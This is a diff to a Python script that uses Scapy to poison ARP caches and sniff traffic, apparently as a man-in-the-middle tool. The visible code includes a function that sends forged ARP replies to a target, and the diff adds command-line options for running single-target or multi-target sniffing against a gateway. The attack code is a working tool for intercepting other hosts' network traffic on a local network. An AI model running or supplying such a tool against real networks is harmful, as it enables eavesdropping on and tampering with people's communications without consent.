@@ -1,5 +1,6 @@
 from scapy.layers.l2 import *
 from scapy.sendrecv import send, sniff
+import sys 
 
 def spoofarpcache(targetip, targetmac, sourceip):
 	send(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)
@@ -42,12 +43,34 @@ def SingleSniffing(targetip, passerelleip):
 	else:
 		print("Ip not reachable")
 
-if input("Multiple or Single ? [M or S]") != "M":
-	iptarget = input("Which ip target :")
-	ippasserelle = input("Which ip passerelle :")
-	SingleSniffing(iptarget, ippasserelle)
-else : 
-    ippasserelle = input("Which ip passerelle :")
-    MultiSniffing(ippasserelle)
+match len(sys.argv):
+    case 1:
+        print("Please can you enter the target IP Adress and Passerelle IP")
+    case 2:
+        match sys.argv[1]:
+            case "-s":
+                print("Please can you enter the target IP Adress and Passerelle IP")
+            case "-m":
+                print("Please can you enter the Passerelle IP")
+            case _:
+                print("Please can you enter the Passerelle IP")
+    case 3:
+        match sys.argv[1]:
+            case "-s":
+                print("Please can you enter the Passerelle IP")
+            case "-m":
+                MultiSniffing(sys.argv[2])
+            case _:
+                SingleSniffing(sys.argv[1], sys.argv[2])
+    case 4:
+        match sys.argv[1]:
+            case "-s":
+                SingleSniffing(sys.argv[2], sys.argv[3])
+            case _:
+                print("To many arguments")
+    case _:
+        print("To many arguments")
+    
+
 
 
